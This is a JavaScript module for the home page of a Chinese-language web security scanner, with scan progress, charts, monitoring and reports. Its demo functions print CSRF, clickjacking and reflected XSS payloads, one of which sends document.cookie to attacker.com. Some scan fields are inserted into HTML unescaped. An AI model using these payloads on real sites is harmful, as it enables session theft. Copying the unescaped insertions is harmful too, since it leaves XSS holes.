/** 首页（page-home）相关函数和逻辑 */

import {
  escapeHtml, escapeAttr, getScoreColor, getScoreGradient, getRiskColor, getRiskClass,
  getHost, copyToClipboard, safeGetElement, safeSetText, safeSetHtml, safeSetValue,
  safeSetDisplay, renderEvidence, extractError, friendlyError, setButtonLoading, renderPagination,
  isPaymentRequired, paymentRequiredMessage
} from '../utils.js';

import { showToast } from '../components/Toast.js';
import JSZip from 'jszip';

import {
  authFetch, apiPost, apiGet, apiDelete, apiPatch, scan, history, trend,
  exportSRCReport, verifyReproduce, findingFeedback, createTicket,
  isLoggedIn, getToken
} from '../api.js';

import { isSRCFormat, renderSRCResult, init as initResultPage } from './result.js';
import { updateUserCredits } from './profile.js';

// ===== Proxy functions for main.js globals =====
function navigateTo(...args) { return window.navigateTo(...args); }
function submitFindingFeedback(...args) { return window.submitFindingFeedback(...args); }
function copyText(...args) { return window.copyText(...args); }
function loadAlerts(...args) { return window.loadAlerts(...args); }
function loadNotificationSettings(...args) { return window.loadNotificationSettings(...args); }
function renderAIConfig(...args) { return window.renderAIConfig(...args); }
function showProfileTab(...args) { return window.showProfileTab(...args); }
function updateAlertBadge(...args) { return window.updateAlertBadge(...args); }

// ===== Module-level state =====
export let lastScanResult = null;
let lastFixResult = null;
let currentFixLang = 'nginx';
let lastFixerResult = null;
let _scanInProgress = false;
let monitorPage = 1;
let monitorPageSize = 5;
let historyPage = 1;
let historyPageSize = 5;
let verifyToken = '';
let selectedVerifyMethod = '';
let _scanCancelled = false;
let _scoreAnimInterval = null;
let _stageTimer = null;
let _progressTimer = null;
let _progressTextTimeouts = [];
let _currentProgress = 0;
let _scanTextIndex = 0;
let _scanTexts = [
  '正在初始化扫描引擎...',
  'DNS 域名解析中...',
  '建立 TCP 连接...',
  '发送 HTTP 请求...',
  '检查响应头安全配置...',
  '检查 HSTS 配置...',
  '检查 CSP 内容安全策略...',
  '检查 X-Frame-Options...',
  '检查 X-Content-Type-Options...',
  '检查 Referrer-Policy...',
  '检查 Permissions-Policy...',
  '检测 SSL/TLS 证书...',
  '验证证书链完整性...',
  '检查证书有效期...',
  '扫描敏感路径...',
  '检测 /.env 文件...',
  '检测 /.git 目录...',
  '检测 /admin 后台...',
  '检测 /phpinfo.php...',
  '检测 /.DS_Store...',
  '识别 WAF 防火墙...',
  '检测 Cloudflare...',
  '检测 Nginx WAF...',
  '检测 ModSecurity...',
  '检查 CORS 跨域配置...',
  '检测 Cookie 安全标志...',
  '检查服务器信息泄露...',
  '计算安全评分...',
  '生成建议...',
  '生成安全报告...',
];
let _history对比Mode = false;
let _history对比Selected = [];

// ----- renderRadarChart -----
function renderRadarChart(data) {
  let container = document.getElementById('radar-chart-container');
  if (!container) return;

  // 计算 5 个维度的得分（每个维度满分 20 分）
  let dims = [
    { name: '加密传输', key: 'https', score: 0 },
    { name: '安全响应头', key: 'headers', score: 0 },
    { name: '信息隐藏', key: 'info', score: 0 },
    { name: 'Cookie安全', key: 'cookie', score: 0 },
    { name: '访问控制', key: 'cors', score: 0 },
  ];
  let isHttps = data.is_https || false;
  let findings = data.findings || [];

  // 加密传输：满分 20
  dims[0].score = isHttps ? 20 : 0;
  // 安全响应头：每个缺失扣 3 分，最低 0
  let headerCount = findings.filter(function(f) { return f.name.indexOf('缺少') === 0 && f.severity === 'high'; }).length;
  dims[1].score = Math.max(0, 20 - headerCount * 3);
  // 信息隐藏：server/x-powered-by 暴露扣 10
  let hasInfo = findings.some(function(f) { return f.name.indexOf('信息泄露') >= 0; });
  dims[2].score = hasInfo ? 10 : 20;
  // Cookie 安全：满分 20
  let hasCookie = findings.some(function(f) { return f.name.indexOf('Cookie') >= 0; });
  dims[3].score = hasCookie ? 10 : 20;
  // 访问控制：CORS 通配符扣 10
  let hasCors = findings.some(function(f) { return f.name.indexOf('CORS') >= 0; });
  dims[4].score = hasCors ? 10 : 20;

  let cx = 150, cy = 150, R = 110;
  let svg = '<svg width="300" height="300" viewBox="0 0 300 300" style="display:block;max-width:100%">';
  // 背景网格（5 层五边形）
  for (let layer = 1; layer <= 5; layer++) {
    let r = (R * layer) / 5;
    let pts = [];
    for (let i = 0; i < 5; i++) {
      let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
      pts.push((cx + r * Math.cos(angle)) + ',' + (cy + r * Math.sin(angle)));
    }
    svg += '<polygon points="' + pts.join(' ') + '" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>';
  }
  // 轴线
  for (let i = 0; i < 5; i++) {
    let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
    let x = cx + R * Math.cos(angle);
    let y = cy + R * Math.sin(angle);
    svg += '<line x1="' + cx + '" y1="' + cy + '" x2="' + x + '" y2="' + y + '" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>';
  }
  // 数据多边形（带渐变 + 动画）
  let dataPts = [];
  for (let i = 0; i < 5; i++) {
    let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
    let r = (R * dims[i].score) / 20;
    dataPts.push((cx + r * Math.cos(angle)) + ',' + (cy + r * Math.sin(angle)));
  }
  svg += '<defs><radialGradient id="radarGrad"><stop offset="0%" stop-color="rgba(75,110,175,0.6)"/><stop offset="100%" stop-color="rgba(168,85,247,0.4)"/></radialGradient></defs>';
  svg += '<polygon points="' + dataPts.join(' ') + '" fill="url(#radarGrad)" stroke="#4b6eaf" stroke-width="2" style="filter:drop-shadow(0 0 8px rgba(75,110,175,0.5));transition:all 1s ease-out">';
  svg += '<animate attributeName="opacity" from="0" to="1" dur="1s" fill="freeze"/>';
  svg += '</polygon>';
  // 数据点
  for (let i = 0; i < 5; i++) {
    let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
    let r = (R * dims[i].score) / 20;
    let x = cx + r * Math.cos(angle);
    let y = cy + r * Math.sin(angle);
    svg += '<circle cx="' + x + '" cy="' + y + '" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="2"/>';
  }
  // 标签
  for (let i = 0; i < 5; i++) {
    let angle = (Math.PI * 2 * i) / 5 - Math.PI / 2;
    let lx = cx + (R + 25) * Math.cos(angle);
    let ly = cy + (R + 25) * Math.sin(angle);
    let anchor = Math.abs(Math.cos(angle)) < 0.2 ? 'middle' : Math.cos(angle) > 0 ? 'start' : 'end';
    svg += '<text x="' + lx + '" y="' + ly + '" text-anchor="' + anchor + '" font-size="12" font-weight="600" fill="var(--text-primary)" dominant-baseline="middle">' + dims[i].name + '</text>';
    svg += '<text x="' + lx + '" y="' + (ly + 14) + '" text-anchor="' + anchor + '" font-size="11" font-weight="700" fill="#4b6eaf" dominant-baseline="middle">' + dims[i].score + '/20</text>';
  }
  svg += '</svg>';
  container.innerHTML = svg;
}

// ----- simulateCSRF -----
function simulateCSRF(target) {
  let out = document.getElementById('attack-演示-result');
  if (!out) return;
  out.innerHTML = '<div style="background:#3c3f41;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s">' +
    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
    '<span style="background:#dc2626;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span>' +
    '<span style="font-weight:600;font-size:13px">CSRF 跨站请求伪造</span></div>' +
    '<div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px">' +
    '<div>// 攻击者构造的恶意页面</div>' +
    '<div>&lt;form action="' + escapeHtml(target) + '/api/transfer" method="POST"&gt;</div>' +
    '<div>&nbsp;&nbsp;&lt;input name="to" value="attacker"&gt;</div>' +
    '<div>&nbsp;&nbsp;&lt;input name="amount" value="10000"&gt;</div>' +
    '<div>&lt;/form&gt;</div>' +
    '<div>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div>' +
    '</div>' +
    '<div style="background:rgba(199,84,80,0.1);border-left:3px solid #c75450;padding:8px 10px;font-size:12px;color:#c75450;border-radius:2px;margin-bottom:10px">' +
    '<strong>如果目标未设置 CSRF 令牌，受害者点击后资金会被转走。</strong></div>' +
    '<div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px">' +
    '<strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">SameSite=Strict</code> Cookie + CSRF 令牌 验证</div>' +
    '</div>';
}

// ----- simulateXSS -----
function simulateXSS(target) {
  let out = document.getElementById('attack-演示-result');
  if (!out) return;
  out.innerHTML = '<div style="background:#3c3f41;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s">' +
    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
    '<span style="background:#ea580c;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span>' +
    '<span style="font-weight:600;font-size:13px">XSS 反射型注入</span></div>' +
    '<div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px">' +
    '<div>// 攻击 URL</div>' +
    '<div>' + escapeHtml(target) + '/search?q=&lt;script&gt;</div>' +
    '<div>&nbsp;&nbsp;fetch(\'//attacker.com/steal?c=\'+document.cookie)</div>' +
    '<div>&nbsp;&nbsp;&lt;/script&gt;</div>' +
    '<div>// 受害者的 Cookie 被发送到攻击者服务器</div>' +
    '</div>' +
    '<div style="background:rgba(240,167,50,0.1);border-left:3px solid #f0a732;padding:8px 10px;font-size:12px;color:#f0a732;border-radius:2px;margin-bottom:10px">' +
    '<strong>如果目标没有 CSP 策略，恶意脚本会被浏览器执行。</strong></div>' +
    '<div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px">' +
    '<strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">Content-Security-Policy</code> 头 + 输入输出转义</div>' +
    '</div>';
}

// ----- simulateClickjacking -----
function simulateClickjacking(target) {
  let out = document.getElementById('attack-演示-result');
  if (!out) return;
  out.innerHTML = '<div style="background:#3c3f41;border:1px solid rgba(168,85,247,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s">' +
    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
    '<span style="background:#9333ea;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span>' +
    '<span style="font-weight:600;font-size:13px">点击劫持</span></div>' +
    '<div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px">' +
    '<div>// 攻击者页面</div>' +
    '<div>&lt;iframe src="' + escapeHtml(target) + '"</div>' +
    '<div>&nbsp;&nbsp;style="opacity:0.1;position:absolute;top:0;left:0;"&gt;</div>' +
    '<div>&lt;/iframe&gt;</div>' +
    '<div>&lt;button style="position:absolute;top:50px"&gt;点这里领奖&lt;/button&gt;</div>' +
    '</div>' +
    '<div style="background:rgba(168,85,247,0.1);border-left:3px solid #9333ea;padding:8px 10px;font-size:12px;color:#c084fc;border-radius:2px;margin-bottom:10px">' +
    '<strong>用户以为点在"领奖"按钮，实际上在点击下层网站的"删除"按钮。</strong></div>' +
    '<div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px">' +
    '<strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">X-Frame-Options: DENY</code> 或 CSP frame-ancestors</div>' +
    '</div>';
}

// ----- global_var_363,animateScoreProgress -----
function animateScoreProgress(targetScore) {
  let ring = document.querySelector('.score-ring .score-value');
  if (!ring) return;
  // 防御性：确保是数字
  targetScore = parseInt(targetScore, 10);
  if (isNaN(targetScore) || targetScore < 0) targetScore = 0;
  if (targetScore > 100) targetScore = 100;
  if (_scoreAnimInterval) { clearInterval(_scoreAnimInterval); _scoreAnimInterval = null; }
  let current = 0;
  let step = Math.max(1, Math.floor(targetScore / 50));
  _scoreAnimInterval = setInterval(function() {
    current += step;
    if (current >= targetScore) {
      current = targetScore;
      clearInterval(_scoreAnimInterval);
      _scoreAnimInterval = null;
    }
    ring.textContent = current;
  }, 20);
}

// ----- getMonitorTargets -----
function getMonitorTargets() {
  try { return (function(){try{return JSON.parse(localStorage.getItem('vs_monitors')||'[]');}catch(e){return [];}})(); } catch(e) { return []; }
}

// ----- saveMonitorTargets -----
function saveMonitorTargets(targets) {
  try { (function(){try{localStorage.setItem('vs_monitors',JSON.stringify(targets));}catch(e){}})(); } catch(e) {}
}

// ----- addMonitorTarget -----
function addMonitorTarget() {
  let urlInput = document.getElementById('monitor-url-input');
  let freqSelect = document.getElementById('monitor-freq-select');
  let url = urlInput.value.trim();
  let freq = freqSelect.value;
  if (!url) { showToast('请输入 URL'); return; }
  if (!/^https?:\/\//i.test(url)) { url = 'http://' + url; }

  let targets = getMonitorTargets();
  // 检查是否已存在
  let exists = targets.some(function(t) { return t.url === url; });
  if (exists) { showToast('该 URL 已在监控列表中'); return; }

  let newTarget = {
    url: url,
    freq: freq,
    added_at: new Date().toISOString(),
    last_scan: '-',
    score: null
  };

  // 尝试调用后端 API
  authFetch('/api/targets', {
    method: 'POST',
    body: JSON.stringify({ url: url, schedule: freq })
  }).then(function(resp) { return resp.json(); }).then(function(data) {
    if (data.id) {
      newTarget.id = data.id;
    }
  }).catch(function() {
    // 后端不可用时使用本地存储
  });

  targets.push(newTarget);
  saveMonitorTargets(targets);
  urlInput.value = '';
  renderMonitorTargets();
  showToast('监控目标已添加');
}

// ----- removeMonitorTarget -----
function removeMonitorTarget(index) {
  if (!confirm("确定要删除此监控目标吗？")) return;
  let targets = getMonitorTargets();
  let target = targets[index];
  if (target && target.id) {
    authFetch('/api/targets/' + target.id, { method: 'DELETE' }).catch(function() {});
  }
  targets.splice(index, 1);
  saveMonitorTargets(targets);
  renderMonitorTargets();
  showToast('监控目标已删除');
}

// ----- renderMonitorTargets -----
function renderMonitorTargets() {
  let list = document.getElementById('monitor-target-list');
  if (!list) return;
  let targets = getMonitorTargets();
  if (targets.length === 0) {
    list.innerHTML = '<div class="monitor-empty">暂无监控目标，请添加需要定期扫描的网站</div>';
    return;
  }
  let freqLabels = { daily: '每天', weekly: '每周', none: '不扫描' };
  let html = '';
  targets.forEach(function(t, i) {
    let scoreColor = t.score !== null ? (t.score >= 75 ? 'var(--success)' : t.score >= 50 ? 'var(--warning)' : 'var(--danger)') : 'var(--text-lighter)';
    html += '<div class="monitor-item">';
    html += '<div style="flex:1;min-width:0">';
    html += '<div class="monitor-item-url">' + escapeHtml(t.url) + '</div>';
    html += '<div class="monitor-item-meta">' + freqLabels[t.freq] || t.freq + ' &middot; 上次扫描: ' + (t.last_scan || '-') + '</div>';
    html += '</div>';
    html += '<div class="monitor-item-score" style="color:' + scoreColor + '">' + (t.score !== null ? t.score : '-') + '</div>';
    html += '<button class="monitor-item-del" onclick="removeMonitorTarget(' + i + ')"></button>';
    html += '</div>';
  });
  list.innerHTML = html;
}

// ----- downloadReport -----
function downloadReport(fmt) {
  if (!lastScanResult) { showToast('暂无扫描结果'); return; }
  let format = fmt || 'pdf';
  let formatName = format === 'html' ? 'HTML' : 'PDF';
  let fileExt = format === 'html' ? 'html' : 'pdf';
  showToast('正在生成 ' + formatName + ' 报告，请稍候...');

  function doDownload(scanId) {
    let url = '/api/report/' + encodeURIComponent(scanId) + '?format=' + format;
    let filename = buildReportFilename(lastScanResult.url, fileExt);
    if (format === 'html') {
      authFetch(url)
        .then(function(resp) {
          if (!resp.ok) throw new Error('报告生成失败（' + resp.status + ')');
          return resp.text();
        })
        .then(function(html) {
          let blob = new Blob([html], { type: 'text/html;charset=utf-8' });
          let blobUrl = URL.createObjectURL(blob);
          let a = document.createElement('a');
          a.href = blobUrl;
          a.download = filename;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          URL.revokeObjectURL(blobUrl);
          showToast('HTML 报告已下载：' + filename);
        })
        .catch(function(e) {
          showToast('报告下载失败: ' + e.message);
        });
    } else {
      authFetch(url)
        .then(function(resp) {
          if (!resp.ok) throw new Error('PDF 生成失败（' + resp.status + ')');
          return resp.blob();
        })
        .then(function(blob) {
          let blobUrl = URL.createObjectURL(blob);
          let a = document.createElement('a');
          a.href = blobUrl;
          a.download = filename;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          URL.revokeObjectURL(blobUrl);
          showToast('PDF 报告已下载：' + filename);
        })
        .catch(function(e) {
          showToast('PDF 下载失败: ' + e.message);
        });
    }
  }

  let scanId = lastScanResult.scan_id;
  // 如果 scan_id 不存在或不是数字，尝试从扫描历史取最新一条
  if (!scanId || isNaN(Number(scanId))) {
    authFetch('/api/history?limit=1')
      .then(function(r) { return r.json(); })
      .then(function(data) {
        let item = (data.history || [])[0];
        if (item && item.id) {
          doDownload(item.id);
        } else {
          showToast('当前结果暂不支持下载');
        }
      })
      .catch(function(e) {
        showToast('获取扫描记录失败: ' + e.message);
      });
  } else {
    doDownload(scanId);
  }
}

// ----- downloadPdfReport -----
function downloadPdfReport() { downloadReport('pdf'); }

function buildReportFilename(scanUrl, format) {
  let host = getHost(scanUrl || 'report');
  let safeHost = (host || 'report').replace(/[^a-zA-Z0-9._-]+/g, '-').replace(/^-+|-+$/g, '') || 'report';
  return 'security-report-' + safeHost + '.' + format;
}

// ----- toggleReportDropdown,closeReportDropdownOutside -----
function toggleReportDropdown() {
  let menu = document.getElementById('report-dropdown');
  if (menu) {
    menu.classList.toggle('show');
    // 点击外部关闭
    if (menu.classList.contains('show')) {
      setTimeout(function() {
        document.addEventListener('click', closeReportDropdownOutside);
      }, 0);
    }
  }
}
function closeReportDropdownOutside(e) {
  let dropdown = document.querySelector('.report-download-dropdown');
  let menu = document.getElementById('report-dropdown');
  if (dropdown && !dropdown.contains(e.target) && menu) {
    menu.classList.remove('show');
    document.removeEventListener('click', closeReportDropdownOutside);
  }
}

function shouldShowHomeOnboarding() {
  try {
    return localStorage.getItem('vs_home_onboarding_seen') !== '1';
  } catch (e) {
    return true;
  }
}

function dismissHomeOnboarding() {
  try {
    localStorage.setItem('vs_home_onboarding_seen', '1');
  } catch (e) {}
  let banner = document.getElementById('home-onboarding-banner');
  if (banner) banner.style.display = 'none';
}

function showHomeOnboarding() {
  let banner = document.getElementById('home-onboarding-banner');
  if (!banner) return;
  if (shouldShowHomeOnboarding()) {
    banner.style.display = 'block';
  } else {
    banner.style.display = 'none';
  }
}

function updateScanCreditsHint() {
  let hint = document.getElementById('scan-credits-hint');
  let value = document.getElementById('scan-credits-value');
  if (!hint || !value) return;
  if (!isLoggedIn()) {
    hint.style.display = 'none';
    return;
  }
  hint.style.display = 'block';
  authFetch('/api/me/credits').then(function(r) { return r.json(); }).then(function(data) {
    let credits = data && data.data && typeof data.data.credits === 'number'
      ? data.data.credits
      : (data && typeof data.credits === 'number' ? data.credits : null);
    value.textContent = credits === null ? '--' : String(credits);
  }).catch(function() {
    value.textContent = '--';
  });
}

// ----- loadDashboard -----
function loadDashboard() {
  let overview = document.getElementById('dashboard-overview');
  if (!isLoggedIn()) {
    if (overview) overview.style.display = 'none';
    return;
  }
  if (overview) overview.style.display = 'grid';
  showHomeOnboarding();
  updateScanCreditsHint();
  authFetch('/api/dashboard').then(function(r) { return r.json(); }).then(function(data) {
    let el1 = document.getElementById('home-stat-scan-count');
    let el2 = document.getElementById('home-stat-high-risk');
    let el3 = document.getElementById('home-stat-fixed-count');
    let el4 = document.getElementById('home-stat-score');
    if (el1) el1.textContent = data.total_scans || 0;
    if (el2) el2.textContent = data.high_risk_count || 0;
    if (el3) el3.textContent = data.fixed_count || 0;
    if (el4 && data.recent_scans && data.recent_scans.length > 0) {
      el4.textContent = data.recent_scans[0].score || '-';
    } else if (el4) {
      el4.textContent = '-';
    }
  }).catch(function() {});
  // Vuln Sentinel: 加载安全趋势
  loadTrend();
  // 加载顶部风险趋势图（7天/30天切换）
  loadTrendChart(30);
}

// ----- loadTrend -----
function loadTrend() {
  let panel = document.getElementById('trend-panel');
  if (!isLoggedIn() || !panel) return;
  panel.style.display = 'block';

  authFetch('/api/trend?limit=30').then(function(r) { return r.json(); }).then(function(data) {
    let summary = data.summary || {};
    let series = data.series || {};
    let urls = data.urls || [];

    // 统计摘要标签
    let summaryEl = document.getElementById('trend-summary');
    if (summaryEl) {
      let tags = [];
      if (summary.total_scans > 0) {
        tags.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-weight:600">平均 ' + summary.avg_score + ' 分</span>');
        if (summary.improved) {
          tags.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(115,201,144,0.12);color:#73c990;font-weight:600"> 评分上升中</span>');
        } else if (summary.total_scans > 1) {
          tags.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(199,84,80,0.12);color:#c75450;font-weight:600"> 评分下降中</span>');
        }
      }
      summaryEl.innerHTML = tags.join('');
    }

    // 无数据时显示空状态
    let emptyEl = document.getElementById('trend-empty');
    let canvas = document.getElementById('trend-canvas');
    if (summary.total_scans === 0) {
      if (emptyEl) emptyEl.style.display = 'flex';
      if (canvas) canvas.style.display = 'none';
      return;
    }
    if (emptyEl) emptyEl.style.display = 'none';
    if (canvas) canvas.style.display = 'block';

    // 绘制折线图
    drawTrendChart(series, urls);
  }).catch(function() {});
}

// ----- drawTrendChart -----
function drawTrendChart(series, urls) {
  let canvas = document.getElementById('trend-canvas');
  if (!canvas) return;
  let ctx = canvas.getContext('2d');
  let dpr = window.devicePixelRatio || 1;
  let rect = canvas.parentElement.getBoundingClientRect();
  canvas.width = rect.width * dpr;
  canvas.height = rect.height * dpr;
  ctx.scale(dpr, dpr);
  let W = rect.width;
  let H = rect.height;

  // 收集所有数据点
  let colors = ['#4b6eaf', '#73c990', '#f0a732', '#c75450', '#c75450', '#4b6eaf', '#4b6eaf'];
  let datasets = [];
  let all评分s = [];
  for (let i = 0; i < urls.length; i++) {
    let url = urls[i];
    let points = series[url] || [];
    if (points.length === 0) continue;
    let scores = points.map(function(p) { return p.score; });
    all评分s = all评分s.concat(scores);
    datasets.push({ url: url, points: points, color: colors[i % colors.length] });
  }

  if (datasets.length === 0 || all评分s.length === 0) return;

  // 图表参数
  let padding = { top: 20, right: 20, bottom: 30, left: 45 };
  let chartW = W - padding.left - padding.right;
  let chartH = H - padding.top - padding.bottom;
  let min评分 = Math.max(Math.min.apply(null, all评分s) - 5, 0);
  let max评分 = Math.min(Math.max.apply(null, all评分s) + 5, 100);
  let scoreRange = max评分 - min评分 || 1;

  // 清空
  ctx.clearRect(0, 0, W, H);

  // 绘制网格线
  ctx.strokeStyle = 'rgba(255,255,255,0.06)';
  ctx.lineWidth = 1;
  let gridLines = 5;
  for (let g = 0; g <= gridLines; g++) {
    let y = padding.top + (g / gridLines) * chartH;
    ctx.beginPath();
    ctx.moveTo(padding.left, y);
    ctx.lineTo(W - padding.right, y);
    ctx.stroke();
    // Y 轴标签
    let val = Math.round(max评分 - (g / gridLines) * scoreRange);
    ctx.fillStyle = 'rgba(255,255,255,0.4)';
    ctx.font = '10px sans-serif';
    ctx.textAlign = 'right';
    ctx.fillText(val, padding.left - 8, y + 3);
  }

  // 绘制安全区间背景
  let safeY = padding.top + ((max评分 - 90) / scoreRange) * chartH;
  let warnY = padding.top + ((max评分 - 70) / scoreRange) * chartH;
  ctx.fillStyle = 'rgba(115,201,144,0.05)';
  ctx.fillRect(padding.left, safeY, chartW, padding.top - safeY + chartH);
  ctx.fillStyle = 'rgba(240,167,50,0.05)';
  ctx.fillRect(padding.left, warnY, chartW, safeY - warnY);

  // 为每个数据集绘制折线和点
  for (let d = 0; d < datasets.length; d++) {
    let ds = datasets[d];
    let pts = ds.points;
    let n = pts.length;
    if (n < 1) continue;

    // 计算 x 坐标（等间距分布）
    let xCoords = [];
    for (let p = 0; p < n; p++) {
      xCoords.push(padding.left + (n > 1 ? (p / (n - 1)) * chartW : chartW / 2));
    }

    // 绘制填充区域
    ctx.beginPath();
    for (let p = 0; p < n; p++) {
      let x = xCoords[p];
      let y = padding.top + ((max评分 - pts[p].score) / scoreRange) * chartH;
      if (p === 0) ctx.moveTo(x, y);
      else ctx.lineTo(x, y);
    }
    ctx.lineTo(xCoords[n - 1], padding.top + chartH);
    ctx.lineTo(xCoords[0], padding.top + chartH);
    ctx.closePath();
    ctx.fillStyle = ds.color + '15';
    ctx.fill();

    // 绘制折线
    ctx.beginPath();
    ctx.strokeStyle = ds.color;
    ctx.lineWidth = 2.5;
    ctx.lineJoin = 'round';
    ctx.lineCap = 'round';
    for (let p = 0; p < n; p++) {
      let x = xCoords[p];
      let y = padding.top + ((max评分 - pts[p].score) / scoreRange) * chartH;
      if (p === 0) ctx.moveTo(x, y);
      else ctx.lineTo(x, y);
    }
    ctx.stroke();

    // 绘制数据点
    for (let p = 0; p < n; p++) {
      let x = xCoords[p];
      let y = padding.top + ((max评分 - pts[p].score) / scoreRange) * chartH;
      ctx.beginPath();
      ctx.arc(x, y, 4, 0, Math.PI * 2);
      ctx.fillStyle = ds.color;
      ctx.fill();
      ctx.beginPath();
      ctx.arc(x, y, 2, 0, Math.PI * 2);
      ctx.fillStyle = '#fff';
      ctx.fill();
    }

    // 最后一个点高亮（显示分数）
    if (n > 0) {
      let lastX = xCoords[n - 1];
      let lastY = padding.top + ((max评分 - pts[n - 1].score) / scoreRange) * chartH;
      ctx.beginPath();
      ctx.arc(lastX, lastY, 6, 0, Math.PI * 2);
      ctx.fillStyle = ds.color + '40';
      ctx.fill();
      ctx.beginPath();
      ctx.arc(lastX, lastY, 3.5, 0, Math.PI * 2);
      ctx.fillStyle = ds.color;
      ctx.fill();
    }
  }

  // 图例
  let legendEl = document.getElementById('trend-legend');
  if (legendEl) {
    let legendHtml = '';
    for (let d = 0; d < datasets.length; d++) {
      let host = getHost(datasets[d].url);
      legendHtml += '<div style="display:flex;align-items:center;gap:5px;font-size:12px">';
      legendHtml += '<div style="width:10px;height:3px;border-radius:2px;background:' + datasets[d].color + '"></div>';
      legendHtml += '<span style="color:var(--text-secondary)">' + escapeHtml(host) + '</span>';
      legendHtml += '</div>';
    }
    legendEl.innerHTML = legendHtml;
  }
}

// ----- loadPublicDemo -----
async function loadPublicDemo() {
  let select = document.getElementById('public-report-host');
  let btn = document.getElementById('public-report-refresh');
  let url = (select && select.value) || 'https://example.com';
  if (btn) { btn.disabled = true; btn.textContent = '扫描中…'; }
  let c = document.getElementById('public-report-content');
  if (c) c.innerHTML = '<div style="height:120px;border-radius:2px;margin-top:12px;background:#3c3f41;border:1px solid #555555;display:flex;align-items:center;justify-content:center;color:#808080;font-size:13px">扫描中…</div>';
  try {
    let r = await authFetch('/api/public-演示-scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: url })
    });
    let data = await r.json();
    if (r.ok && data.success) {
      window._lastScanId = data.scan_id || data.scanId || null;  // Vuln Sentinel: 保存 scan_id 供自动修复用
      window._lastScanResult = data;  // V11.4 fix: 保存扫描结果供自动修复使用
      renderDemoReport(data);
    } else {
      if (c) c.innerHTML = '<div style="padding:14px;color:#c75450;font-size:13px">错误：' + escapeHtml(friendlyError(extractError(data))) + '</div>';
    }
  } catch (e) {
    if (c) c.innerHTML = '<div style="padding:14px;color:#c75450;font-size:13px">错误：' + escapeHtml(friendlyError(e)) + '</div>';
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = '重新扫描'; }
  }
}

// ----- renderDemoReport -----
function renderDemoReport(d) {
  let c = document.getElementById('public-report-content');
  if (!c) return;
  let score = d.score || 0;
  let color = score >= 80 ? '#73c990' : score >= 50 ? '#f0a732' : '#c75450';
  let bgColor = '#3c3f41';
  let findings = d.findings || [];
  let summary = d.summary || { high: 0, medium: 0, low: 0 };
  let findingsSummary = [];
  if (summary.high) findingsSummary.push(summary.high + ' 高风险');
  if (summary.medium) findingsSummary.push(summary.medium + ' 中风险');
  if (summary.low) findingsSummary.push(summary.low + ' 低风险');
  let waf = d.waf || [];
  let wafText = waf.length ? waf.map(function(w){ return w.name; }).join('、') : '未检测到 WAF';
  let headers = d.raw_headers || {};
  let presentHeaders = Object.keys(headers);
  let missingCritical = [];
  ['strict-transport-security', 'content-security-policy', 'x-frame-options', 'x-content-type-options'].forEach(function(h) {
    if (!presentHeaders.some(function(p){ return p.toLowerCase() === h; })) missingCritical.push(h);
  });
  let sensitive = d.sensitive_paths || [];
  let sensitiveHtml = '';
  if (sensitive.length > 0) {
    sensitiveHtml = sensitive.slice(0, 5).map(function(s) {
      let status = s.exposed ? '暴露' : '安全';
      return '<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 8px;font-size:12px;border-bottom:1px solid var(--border)"><code style="color:#a5b4fc">/' + s.path + '</code><span>' + status + '</span></div>';
    }).join('');
  } else {
    sensitiveHtml = '<div style="font-size:12px;color:var(--text-secondary);padding:4px">已扫描 ' + (d.sensitive_checked || 0) + ' 个常见敏感路径，未发现暴露</div>';
  }

  let html = '';
  // 概览条
  html += '<div style="background:' + bgColor + ';border:1px solid #555555;border-left:3px solid ' + color + ';border-radius:2px;padding:14px;margin-top:12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">';
  html += '<div><div style="font-size:13px;color:var(--text-secondary)">实时扫描结果</div>';
  if (d.note) {
    html += '<div style="font-size:12px;color:#f0a732;margin-top:2px">' + escapeHtml(d.note) + '</div>';
  }
  html += '<div style="font-size:14px;font-weight:600;margin-top:2px">' + d.final_url + '</div>';
